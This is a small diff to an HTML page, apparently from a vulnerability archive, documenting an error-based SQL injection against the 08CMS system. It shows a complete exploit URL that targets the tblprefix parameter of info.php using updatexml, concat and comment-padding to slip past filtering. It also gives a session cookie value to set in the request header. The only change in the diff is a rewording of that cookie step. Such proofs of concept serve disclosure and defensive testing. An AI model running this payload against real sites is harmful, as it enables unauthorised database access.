@@ -3,8 +3,8 @@
     <h3>报错注入URL: </h3>
     <code>http://example.com/info.php?fid=1&tblprefix=cms_msession/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23</code>
     <br>
-    <code>cookie : umW_msid=rsLQWU</code>
-    <p>ps: 注意cookiet替换</p>
+    <p>修改请求头中的cookie为</p>
+    <code>cookie:umW_msid=rsLQWU</code>
     <h3>返回结果</h3>
     <img src="/vulns/imgs/08CMS_0000.jpg">
 </div>
